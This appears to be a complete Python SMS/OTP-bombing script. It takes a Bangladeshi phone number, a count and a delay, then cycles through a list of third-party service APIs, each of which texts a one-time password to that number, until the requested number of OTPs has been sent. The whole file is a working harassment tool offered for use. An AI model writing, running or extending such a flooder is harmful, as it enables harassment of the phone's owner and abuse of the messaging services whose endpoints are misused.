import time
import requests
import json
from api import APIS


def send_serial_otp(phone, total_otp, delay):
    sent_count = 0

    while sent_count < total_otp:
        for api in APIS:
            if sent_count >= total_otp:
                break

            try:
                # ---------- phone formatting ----------
                req_phone = phone
                if api.get("add_88"):
                    if not req_phone.startswith("+880"):
                        req_phone = "+880" + req_phone.lstrip("0")

                # ---------- URL handle (string / lambda) ----------
                url = api["url"](req_phone) if callable(api["url"]) else api["url"]

                # ---------- payload ----------
                payload = api["payload"](req_phone) if api.get("payload") else None
                headers = api.get("headers", {})
                method = api.get("method", "POST").upper()

                # ---------- request ----------
                if method == "POST":
                    resp = requests.post(url, json=payload, headers=headers, timeout=15)
                else:
                    resp = requests.get(url, params=payload, headers=headers, timeout=15)

                # ---------- output ----------
                print("\n------------------------------------------------------------")
                print(f"📤 API: {api['name']}")
                print(f"URL: {url}")
                print(f"Method: {method}")
                print(f"Payload: {json.dumps(payload, indent=2) if payload else None}")
                print(f"Status Code: {resp.status_code}")

                if resp.status_code in [200, 201]:
                    sent_count += 1
                    print(f"✅ RESULT: SUCCESS | OTP sent: {sent_count}/{total_otp}")
                elif 400 <= resp.status_code < 500:
                    print("⚠️ RESULT: CLIENT ERROR (Auth / Validation issue)")
                else:
                    print("❌ RESULT: SERVER ERROR")

                print(f"Response: {resp.text[:500]}")

            except requests.exceptions.RequestException as e:
                print("\n------------------------------------------------------------")
                print(f"🔥 {api['name']} REQUEST ERROR:", e)

            time.sleep(delay)

    print(f"\n🎉 DONE! Total OTP processed: {total_otp}")


if __name__ == "__main__":
    phone_input = input("Enter Bangladeshi number (013XXXXXXXX): ").strip()
    total_otp = int(input("How many OTPs to send?: ").strip())
    delay_sec = float(input("Delay between API calls (seconds): ").strip())

    send_serial_otp(phone_input, total_otp, delay_sec)
# sender.py

def send_exact(phone, total_otp, delay):
    send_serial_otp(phone, total_otp, delay)

